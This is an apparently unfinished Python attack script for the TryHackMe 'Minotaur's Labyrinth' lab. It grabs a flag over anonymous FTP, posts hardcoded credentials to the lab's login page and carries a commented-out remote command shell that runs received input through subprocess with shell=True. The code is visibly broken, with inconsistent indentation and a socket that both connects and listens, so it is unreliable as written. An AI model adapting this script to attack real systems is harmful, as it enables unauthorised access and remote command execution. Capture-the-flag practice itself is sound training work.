#!/usr/bin/env python3
#made on mar 31 2023
#TryHackMe's "Minotaur's Labyrinth"
#made in python3
#Testing phase
import requests as req
import sys
import socket
import os
from bs4 import BeautifulSoup
from subprocess import run
from ftplib import FTP

tar_ip = sys.argv[1] #target IP
Host = sys.argv[2] #local IP (your ip)
Port = sys.argv[3] #port 
sess = req.Session()

#Needs 'Try' and 'except'
def Mino_ftp_engine():

    with FTP(tar_ip) as conn:
         fn = 'flag.txt'
         conn.login(user='anonymous', passwd='anonymous')
         conn.cwd('/pub/.secret')

         conn.retrbinary("RETR " + fn, open(fn, 'wb').write)
          with open('flag.txt', 'r') as fp:
               open_f = fp.read()
               print("First flag: ", open_f)
               fp.close()
         conn.quit()

Mino_ftp_engine()

def Mino_web_engine_login():
    
    url_L = f'http://{tar_ip}/login.php'
    PostData_L = {'email': 'M!n0taur', 'password': 'aminotauro'}
    res = sess.post(url_L, data=PostData_L)
    soup = BeautifulSoup(res.content, "html.parser")

    fetch_href_flag = soup.find_all("a")
    print("Second flag", fetch_href_flag)

Mino_web_engine_login()

'''
Mino_shell_S(): 
  
   #start here

Mino_shell_S()         \
                         ---- Both are partially done. One needs something in it while the other needs to be tested
Mino_shell_C():        /
    
    with socket.socket(AF_INET, SOCK_STREAM) as s:
         s.connect((tar_ip, Port))
         s.listen(1)
         conn, addr = s.accept()
            
         while True:
             tk = s.recv(1024)
             
             if 'kill' in tk:
                s.close()
                break
                
             else:
                SP = subprocess.Popen(tk, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                s.send(SP.stdout.read)
                s.send(SP.stderr.read)
                
Mino_shell_C()
'''
